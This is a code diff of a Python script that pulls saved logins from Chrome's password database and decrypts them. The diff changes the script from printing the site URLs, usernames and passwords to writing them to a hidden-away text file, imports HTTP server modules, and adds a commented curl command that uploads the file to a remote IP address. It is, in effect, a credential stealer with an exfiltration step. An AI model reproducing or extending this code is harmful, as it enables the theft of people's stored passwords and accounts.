@@ -5,6 +5,8 @@ import json
 import base64
 import sqlite3
 import shutil
+import SimpleHTTPServer
+import SocketServer
 from datetime import timezone, datetime, timedelta
 
 #3rd party modules
@@ -48,6 +50,7 @@ def decrypt_password(enc_password, key):
         except:
             return "No Passwords(logged in with Social Account)"
 
+
 def main():
 
     # local passwords path
@@ -66,7 +69,7 @@ def main():
 
     #get the encryption key
     encp_key = encryption_key()
-    print("\n|","-"*50, "|\n")
+    #print("\n|","-"*50, "|\n")
     # iterate over all rows
     for row in cursor.fetchall():
         site_url = row[0]
@@ -75,14 +78,15 @@ def main():
         date_created = row[3]
 
         if username or password:
-            print("Site Login URL:", site_url)
-            print("Username/Email:", username)
-            print(f"Password:",password)
+            with open("C:/Users/User/Desktop/file.txt", "a") as o:
+                o.write(site_url + '\n')
+                o.write(username + '\n')
+                o.write(password + '\n') 
         else:
             continue
         if date_created:
             print("Date date_created:", str(my_chrome_datetime(date_created)))
-        print("\n|","-"*50, "|\n")
+        #print("\n|","-"*50, "|\n")
 
     cursor.close()
     db.close()
@@ -92,3 +96,5 @@ def main():
 
 if __name__ == "__main__":
     main()
+
+    #for file upload: curl http://192.168.43.204:8000 --upload-file file.txt
